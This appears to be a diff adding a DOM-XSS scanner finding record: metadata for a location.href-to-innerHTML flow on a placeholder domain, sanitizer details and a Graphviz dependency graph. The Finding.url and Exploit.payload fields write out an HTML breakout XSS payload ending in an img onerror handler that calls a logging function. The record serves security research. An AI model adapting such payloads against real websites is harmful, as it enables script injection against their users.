@@ -1,0 +1,82 @@
+// Finding: 2d6b28f1-bbc4-46ec-949f-8e3ed1ee6cbb
+// Finding.url: https://n.example123.com/content/prospects/2022/keithian-alexander-236941##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('167019ab2cd84550bedf162f2d9d719c')><!--/*
+// Finding.parentloc: https://n.example123.com/content/prospects/2022/keithian-alexander-236941##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('167019ab2cd84550bedf162f2d9d719c')><!--/*
+// Finding.domain: n.example123.com
+// Finding.base_domain: example123.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 3
+// Sanitizer.name: _
+// Sanitizer.location: https://s.example119.com/rq/darla/4-8-0/js/g-r-min.js - _:1:3616
+// Finding.begin: 17492
+// Finding.end: 17497
+// Finding.original_uuid: 71f1ce0c-4837-440c-be32-4053afd07fab
+// Finding.TwentyFiveMillionFlowsId: 645378729
+// Finding.script: https://s.example119.com/rq/darla/4-8-0/js/g-r-min.js
+// Finding.line: 1
+// Exploit.uuid: 167019ab-2cd8-4550-bedf-162f2d9d719c
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: name
+// Exploit.quote_type: "
+// Exploit.tag: iframe
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 5
+// Exploit.replace_begin_url: 69
+// Exploit.replace_end_url: 69
+// Exploit.replace_begin_param: 10320
+// Exploit.replace_end_param: 10320
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 416146957
+// DepGraph.sanitizer_hash: -1825706680
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="substr"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=box, label="Lit: 0"];
+n4 [shape=box, label="Lit: 5"];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: "];
+n7 [shape=ellipse, label="."];
+n8 [shape=box, label="Lit: "];
+n9 [shape=ellipse, label="escape"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=box, label="Var: x"];
+n12 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n5 -> n6;
+n5 -> n1;
+n7 -> n5;
+n7 -> n8;
+n10 -> n7;
+n9 -> n10;
+n11 -> n9;
+n12 -> n11;
+}
